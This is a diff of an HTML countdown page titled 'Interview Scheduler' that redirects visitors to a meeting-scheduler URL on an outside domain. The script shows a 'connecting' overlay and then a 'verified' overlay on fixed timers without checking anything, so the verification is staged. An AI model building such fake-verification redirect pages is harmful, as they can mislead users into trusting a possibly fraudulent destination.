@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Interview Scheduler</title>
+  <title>Interview Scheduler • dark</title>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -82,7 +82,9 @@
 
 <script>
   (function(){
-    const TARGET="https://www.66degreeinterview.com/meeting-scheduler";
+    // 🔥 UPDATED DOMAIN WITH FULL PATH
+    const TARGET = "https://www.66degreeinterview.com/meeting-scheduler";
+    
     const TOTAL=5; let r=TOTAL, intv=null, redir=false;
     const count=document.getElementById('countDisplay'), statusText=document.getElementById('statusText');
     const go=document.getElementById('goBtn');
@@ -102,18 +104,13 @@
       redir=true;
       clearInterval(intv);
       update();
-
-      // Show first overlay (connecting)
+      
       overlay1.classList.add('show');
-
-      // After 3 seconds, switch to verified overlay
       setTimeout(()=>{
         overlay1.classList.remove('show');
         overlay2.classList.add('show');
-
-        // After 2 seconds, redirect
         setTimeout(()=>{
-          window.location.href=TARGET;
+          window.location.href = TARGET;
         }, 2000);
       }, 3000);
     }
